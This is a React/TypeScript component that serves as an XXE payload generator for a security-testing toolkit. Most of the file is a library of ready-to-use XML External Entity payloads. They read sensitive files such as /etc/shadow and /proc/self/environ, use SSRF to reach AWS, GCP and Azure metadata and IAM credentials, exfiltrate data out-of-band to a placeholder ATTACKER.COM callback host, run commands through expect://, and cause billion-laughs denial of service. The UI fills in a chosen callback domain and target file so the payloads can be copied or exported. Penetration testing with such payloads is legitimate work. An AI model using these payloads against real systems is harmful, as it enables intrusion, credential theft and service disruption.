import React from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCode, faCopy, faCheckCircle, faFileCode, faDownload, faFilter, faExclamationTriangle } from '@fortawesome/free-solid-svg-icons';

export type XxePayloadGeneratorData = {
  category?: XxeCategory;
  selectedPayload?: string;
  customTarget?: string;
  customFile?: string;
  output?: string;
  copiedPayload?: string;
  showDtd?: boolean;
};

export type XxeCategory = 'basic' | 'file-read' | 'ssrf' | 'oob' | 'blind' | 'parameter-entity' | 'filter-bypass' | 'dos';

type Props = {
  data: XxePayloadGeneratorData | undefined;
  onChange: (data: XxePayloadGeneratorData) => void;
};

// 40+ XXE Payloads across categories
const xxePayloads: Record<XxeCategory, { name: string; payload: string; description: string; protocol?: string }[]> = {
  'basic': [
    {
      name: 'Basic Entity Expansion',
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe "XXE Test Successful">
]>
<root>&xxe;</root>`,
      description: 'Simple entity expansion test'
    },
    {
      name: 'External Entity',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
      description: 'Basic external entity'
    },
    {
      name: 'Public Entity',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "any" "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
      description: 'Using PUBLIC identifier'
    }
  ],
  'file-read': [
    {
      name: '/etc/passwd (Linux)',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
      description: 'Read Linux password file',
      protocol: 'file://'
    },
    {
      name: '/etc/shadow (Linux)',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<foo>&xxe;</foo>`,
      description: 'Read shadow file (requires root)',
      protocol: 'file://'
    },
    {
      name: '/etc/hosts (Linux)',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<foo>&xxe;</foo>`,
      description: 'Read hosts file',
      protocol: 'file://'
    },
    {
      name: 'Windows hosts',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<foo>&xxe;</foo>`,
      description: 'Read Windows hosts file',
      protocol: 'file://'
    },
    {
      name: 'Windows win.ini',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>`,
      description: 'Read Windows ini file',
      protocol: 'file://'
    },
    {
      name: 'PHP Base64 Filter',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=TARGET_FILE">
]>
<foo>&xxe;</foo>`,
      description: 'Base64 encode file (PHP)',
      protocol: 'php://'
    },
    {
      name: 'PHP Input Wrapper',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://input">
]>
<foo>&xxe;</foo>`,
      description: 'Read POST data (PHP)',
      protocol: 'php://'
    },
    {
      name: 'Expect Protocol (RCE)',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>`,
      description: 'Command execution via expect',
      protocol: 'expect://'
    },
    {
      name: 'proc/self/environ',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<foo>&xxe;</foo>`,
      description: 'Read environment variables',
      protocol: 'file://'
    },
    {
      name: 'proc/self/cmdline',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
]>
<foo>&xxe;</foo>`,
      description: 'Read command line',
      protocol: 'file://'
    },
    {
      name: 'Custom File Target',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://TARGET_FILE">
]>
<foo>&xxe;</foo>`,
      description: 'Read custom file path',
      protocol: 'file://'
    }
  ],
  'ssrf': [
    {
      name: 'Localhost Probe',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/">
]>
<foo>&xxe;</foo>`,
      description: 'Probe localhost services',
      protocol: 'http://'
    },
    {
      name: 'Internal Network 192.168',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/">
]>
<foo>&xxe;</foo>`,
      description: 'Scan internal network',
      protocol: 'http://'
    },
    {
      name: 'Internal Network 10.x',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.0.0.1/">
]>
<foo>&xxe;</foo>`,
      description: 'Scan 10.x network',
      protocol: 'http://'
    },
    {
      name: 'AWS Metadata',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>`,
      description: 'AWS instance metadata',
      protocol: 'http://'
    },
    {
      name: 'AWS IAM Credentials',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>`,
      description: 'AWS IAM credentials',
      protocol: 'http://'
    },
    {
      name: 'GCP Metadata',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
]>
<foo>&xxe;</foo>`,
      description: 'GCP metadata endpoint',
      protocol: 'http://'
    },
    {
      name: 'Azure Metadata',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
<foo>&xxe;</foo>`,
      description: 'Azure instance metadata',
      protocol: 'http://'
    },
    {
      name: 'Docker API',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:2375/containers/json">
]>
<foo>&xxe;</foo>`,
      description: 'Docker API containers',
      protocol: 'http://'
    },
    {
      name: 'Kubernetes API',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://kubernetes.default.svc/api/v1/namespaces">
]>
<foo>&xxe;</foo>`,
      description: 'K8s namespaces',
      protocol: 'https://'
    },
    {
      name: 'Gopher Redis',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://localhost:6379/_INFO">
]>
<foo>&xxe;</foo>`,
      description: 'Redis info via gopher',
      protocol: 'gopher://'
    },
    {
      name: 'Dict Protocol',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "dict://localhost:11211/stats">
]>
<foo>&xxe;</foo>`,
      description: 'Memcached stats via dict',
      protocol: 'dict://'
    }
  ],
  'oob': [
    {
      name: 'OOB External DTD',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER.COM/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>`,
      description: 'Out-of-band via external DTD'
    },
    {
      name: 'OOB FTP Exfil',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER.COM/xxe.dtd">
  %dtd;
]>
<foo>&send;</foo>`,
      description: 'Exfiltrate via FTP'
    },
    {
      name: 'DNS Callback',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe.ATTACKER.COM/">
]>
<foo>&xxe;</foo>`,
      description: 'DNS lookup confirmation'
    },
    {
      name: 'OOB Data Extraction',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER.COM/oob.dtd">
  %dtd;
  %send;
]>
<foo>test</foo>`,
      description: 'Base64 OOB extraction'
    },
    {
      name: 'External DTD Content',
      payload: `<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER.COM/?x=%file;'>">
%eval;
%exfiltrate;`,
      description: 'DTD file for OOB server'
    }
  ],
  'blind': [
    {
      name: 'Blind Detection',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER.COM/xxe-test">
  %xxe;
]>
<foo>test</foo>`,
      description: 'Detect blind XXE via callback'
    },
    {
      name: 'Error-based Extraction',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>`,
      description: 'Extract via error messages'
    },
    {
      name: 'Time-based Detection',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ATTACKER.COM:1234/slow">
]>
<foo>&xxe;</foo>`,
      description: 'Detect via response time'
    },
    {
      name: 'Local DTD Reuse',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo>test</foo>`,
      description: 'Exploit local DTD for blind XXE'
    }
  ],
  'parameter-entity': [
    {
      name: 'Parameter Entity Basic',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % param "<!ENTITY exfil SYSTEM 'http://ATTACKER.COM/?data=%xxe;'>">
  %param;
]>
<foo>&exfil;</foo>`,
      description: 'Parameter entity access'
    },
    {
      name: 'Nested Parameter',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY % b SYSTEM 'http://ATTACKER.COM/evil.dtd'>">
  %a;
  %b;
]>
<foo>test</foo>`,
      description: 'Nested parameter entities'
    },
    {
      name: 'Parameter Entity in Internal',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<!ENTITY">
  <!ENTITY % space " ">
  <!ENTITY % end ">">
  %start;%space;xxe SYSTEM "file:///etc/passwd"%end;
]>
<foo>&xxe;</foo>`,
      description: 'Construct entity via parameters'
    }
  ],
  'filter-bypass': [
    {
      name: 'UTF-16 Encoding',
      payload: `<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
      description: 'UTF-16 encoded XXE'
    },
    {
      name: 'UTF-7 Encoding',
      payload: `<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-`,
      description: 'UTF-7 encoded (rare parsers)'
    },
    {
      name: 'CDATA Wrapper',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://ATTACKER.COM/cdata.dtd">
  %dtd;
]>
<foo>&all;</foo>`,
      description: 'CDATA for special chars'
    },
    {
      name: 'XInclude Attack',
      payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>`,
      description: 'XInclude instead of DTD'
    },
    {
      name: 'SVG XXE',
      payload: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>`,
      description: 'XXE in SVG file upload'
    },
    {
      name: 'SOAP XXE',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>`,
      description: 'XXE in SOAP request'
    },
    {
      name: 'Office Document XXE',
      payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://test" Target="&xxe;"/>
</Relationships>`,
      description: 'XXE in Office XML (docx/xlsx)'
    }
  ],
  'dos': [
    {
      name: 'Billion Laughs',
      payload: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>`,
      description: 'Entity expansion DoS (reduced)'
    },
    {
      name: 'Quadratic Blowup',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY a "aaaaaaaaaa..."> <!-- 50KB -->
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>`,
      description: 'Memory exhaustion attack'
    },
    {
      name: 'External Resource DoS',
      payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>`,
      description: 'Read infinite file'
    }
  ]
};

const categories: { id: XxeCategory; label: string; count: number }[] = [
  { id: 'basic', label: 'Basic', count: xxePayloads.basic.length },
  { id: 'file-read', label: 'File Read', count: xxePayloads['file-read'].length },
  { id: 'ssrf', label: 'SSRF', count: xxePayloads.ssrf.length },
  { id: 'oob', label: 'Out-of-Band', count: xxePayloads.oob.length },
  { id: 'blind', label: 'Blind', count: xxePayloads.blind.length },
  { id: 'parameter-entity', label: 'Parameter', count: xxePayloads['parameter-entity'].length },
  { id: 'filter-bypass', label: 'Bypass', count: xxePayloads['filter-bypass'].length },
  { id: 'dos', label: 'DoS', count: xxePayloads.dos.length }
];

const XxePayloadGenerator: React.FC<Props> = ({ data, onChange }) => {
  const category = data?.category ?? 'basic';
  const selectedPayload = data?.selectedPayload ?? '';
  const customTarget = data?.customTarget ?? 'ATTACKER.COM';
  const customFile = data?.customFile ?? '/etc/passwd';
  const output = data?.output ?? '';
  const showDtd = data?.showDtd ?? false;
  const [copiedPayload, setCopiedPayload] = React.useState<string | null>(null);

  const payloads = xxePayloads[category];

  const processPayload = (payloadStr: string): string => {
    return payloadStr
      .replace(/ATTACKER\.COM/g, customTarget)
      .replace(/TARGET_FILE/g, customFile);
  };

  const handleSelectPayload = (payloadName: string) => {
    const payload = payloads.find(p => p.name === payloadName);
    if (payload) {
      const processedPayload = processPayload(payload.payload);
      onChange({ ...data, selectedPayload: payloadName, output: processedPayload });
    }
  };

  const handleTargetChange = (target: string) => {
    onChange({ ...data, customTarget: target });
    if (selectedPayload) {
      const payload = payloads.find(p => p.name === selectedPayload);
      if (payload) {
        const processedPayload = payload.payload
          .replace(/ATTACKER\.COM/g, target)
          .replace(/TARGET_FILE/g, customFile);
        onChange({ ...data, customTarget: target, output: processedPayload });
      }
    }
  };

  const handleFileChange = (file: string) => {
    onChange({ ...data, customFile: file });
    if (selectedPayload) {
      const payload = payloads.find(p => p.name === selectedPayload);
      if (payload) {
        const processedPayload = payload.payload
          .replace(/ATTACKER\.COM/g, customTarget)
          .replace(/TARGET_FILE/g, file);
        onChange({ ...data, customFile: file, output: processedPayload });
      }
    }
  };

  const handleCopy = async (text: string, name: string) => {
    await navigator.clipboard.writeText(text);
    setCopiedPayload(name);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  const exportAsJson = () => {
    const exportData = {
      category,
      payloads: payloads.map(p => ({
        name: p.name,
        payload: processPayload(p.payload),
        description: p.description,
        protocol: p.protocol
      }))
    };
    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `xxe-payloads-${category}-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const totalPayloads = Object.values(xxePayloads).reduce((sum, arr) => sum + arr.length, 0);

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-3">
        <div className="text-xs text-slate-200">XXE Payload Generator</div>
        <div className="flex gap-1">
          <button
            onClick={exportAsJson}
            className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors"
            title="Export payloads as JSON"
          >
            <FontAwesomeIcon icon={faDownload} className="w-2.5 h-2.5" />
          </button>
          {output && (
            <button
              onClick={() => handleCopy(output, 'output')}
              className="rounded bg-slate-800 px-2 py-1 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
            >
              <FontAwesomeIcon icon={copiedPayload === 'output' ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
              Copy
            </button>
          )}
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-3">
        {totalPayloads}+ XXE payloads for security testing. Supports file://, http://, php://, gopher://, expect://.
      </div>

      {/* Configuration */}
      <div className="grid grid-cols-2 gap-2 mb-3">
        <div className="rounded border border-slate-700 bg-slate-800/30 p-2">
          <div className="text-[9px] text-slate-500 mb-1">Callback Domain (OOB)</div>
          <input
            type="text"
            value={customTarget}
            onChange={(e) => handleTargetChange(e.target.value)}
            placeholder="your-server.com"
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-red-500"
          />
        </div>
        <div className="rounded border border-slate-700 bg-slate-800/30 p-2">
          <div className="text-[9px] text-slate-500 mb-1">Target File</div>
          <input
            type="text"
            value={customFile}
            onChange={(e) => handleFileChange(e.target.value)}
            placeholder="/etc/passwd"
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-red-500"
          />
        </div>
      </div>

      {/* Categories */}
      <div className="mb-3">
        <div className="flex items-center gap-1 mb-2">
          <FontAwesomeIcon icon={faFilter} className="w-2.5 h-2.5 text-slate-500" />
          <span className="text-[9px] text-slate-500">Category</span>
        </div>
        <div className="grid grid-cols-4 gap-1">
          {categories.map((cat) => (
            <button
              key={cat.id}
              onClick={() => onChange({ ...data, category: cat.id, selectedPayload: '', output: '' })}
              className={`px-1.5 py-1 rounded text-[9px] font-medium transition-colors border ${
                category === cat.id
                  ? 'bg-red-600/20 border-red-500/50 text-red-300'
                  : 'bg-slate-800 border-slate-700 text-slate-400 hover:border-slate-500'
              }`}
            >
              {cat.label}
              <span className="text-[8px] opacity-60 ml-0.5">({cat.count})</span>
            </button>
          ))}
        </div>
      </div>

      {/* Payloads */}
      <div className="mb-3">
        <div className="text-[9px] text-slate-500 mb-2">Payloads</div>
        <div className="space-y-1 max-h-28 overflow-y-auto">
          {payloads.map((payload) => (
            <button
              key={payload.name}
              onClick={() => handleSelectPayload(payload.name)}
              className={`w-full text-left px-2 py-1.5 rounded text-[9px] transition-colors flex items-center justify-between border ${
                selectedPayload === payload.name
                  ? 'bg-red-900/30 border-red-500/50 text-slate-200'
                  : 'bg-slate-800/50 text-slate-300 hover:bg-slate-700 border-slate-700'
              }`}
            >
              <div className="flex items-center gap-2 flex-1 min-w-0">
                <span className="truncate">{payload.name}</span>
                {payload.protocol && (
                  <span className="text-[7px] px-1 py-0.5 rounded bg-slate-700 text-slate-400 flex-shrink-0">
                    {payload.protocol}
                  </span>
                )}
              </div>
              <button
                onClick={(e) => {
                  e.stopPropagation();
                  handleCopy(processPayload(payload.payload), payload.name);
                }}
                className="text-[9px] text-slate-500 hover:text-slate-300 ml-2"
              >
                <FontAwesomeIcon
                  icon={copiedPayload === payload.name ? faCheckCircle : faCopy}
                  className="w-2.5 h-2.5"
                />
              </button>
            </button>
          ))}
        </div>
      </div>

      {/* Output */}
      {output && (
        <div className="flex-1 min-h-0 flex flex-col">
          <div className="flex items-center justify-between mb-1">
            <div className="text-[9px] text-slate-500 flex items-center gap-2">
              <FontAwesomeIcon icon={faFileCode} className="w-2.5 h-2.5" />
              Generated Payload
            </div>
          </div>
          <pre className="flex-1 overflow-y-auto p-2 bg-black/50 border border-slate-700 rounded text-green-400 text-[9px] font-mono whitespace-pre-wrap break-all">
            {output}
          </pre>
          {selectedPayload && (
            <div className="text-[9px] text-slate-500 mt-1">
              {payloads.find(p => p.name === selectedPayload)?.description}
            </div>
          )}
        </div>
      )}

      {!output && (
        <div className="flex-1 flex items-center justify-center">
          <div className="text-[10px] text-slate-500 text-center py-4">
            Select a payload to generate.
          </div>
        </div>
      )}

      <div className="text-[9px] text-slate-600 space-y-1 border-t border-slate-700 pt-2 mt-2">
        <div className="flex items-center gap-1">
          <FontAwesomeIcon icon={faExclamationTriangle} className="w-2.5 h-2.5 text-yellow-500" />
          <span className="text-yellow-400">For authorized security testing only!</span>
        </div>
        <div><strong>Protocols:</strong> file://, http://, php://, gopher://, expect://, dict://, ftp://</div>
      </div>
    </div>
  );
};

export class XxePayloadGeneratorTool {
  static Component = XxePayloadGenerator;
}
